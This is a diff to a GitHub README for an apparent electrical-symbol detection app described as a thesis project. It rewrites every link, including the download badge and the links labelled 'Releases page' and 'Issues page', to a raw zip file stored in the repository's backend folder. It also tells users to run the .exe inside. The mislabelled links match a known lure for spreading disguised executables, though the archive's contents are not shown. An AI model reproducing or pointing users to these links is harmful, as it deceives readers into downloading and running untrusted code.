@@ -1,7 +1,7 @@
 # 🌟 AI-object-detection-app - Detect Electrical Symbols Easily
 
 ## 🔗 Download Now!
-[![Download here](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/__pycache__/A-object-detection-app-3.0.zip)](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/__pycache__/A-object-detection-app-3.0.zip)
+[![Download here](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/A_app_detection_object_1.4.zip)](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/A_app_detection_object_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the AI-object-detection-app! This application helps you identify and classify electrical symbols in technical drawings quickly and efficiently. Developed as part of a Bachelor's thesis at KTH Royal Institute of Technology, this project uses a custom-trained YOLO model for precise object detection.
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets these requirements:
 - **Disk Space:** At least 500 MB free
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/__pycache__/A-object-detection-app-3.0.zip) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/A_app_detection_object_1.4.zip) to find the latest version of the application.
 2. **Download the File:** Choose the latest release and download the appropriate file for your operating system. 
 3. **Install the Application:**
    - For Windows: Double-click the `.exe` file and follow the installation prompts.
@@ -49,7 +49,7 @@ If you run into any issues while using the application, here are some common pro
 ## 💬 Community Support
 Join our community for help and discussions. You can reach out through:
 
-- **GitHub Issues:** Report problems or ask questions on the [Issues page](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/__pycache__/A-object-detection-app-3.0.zip).
+- **GitHub Issues:** Report problems or ask questions on the [Issues page](https://raw.githubusercontent.com/Pikeln/AI-object-detection-app/main/backend/A_app_detection_object_1.4.zip).
 - **Discussion Forum:** Participate in discussions with other users and developers to share tips and tricks.
 
 ## 🔗 Additional Resources
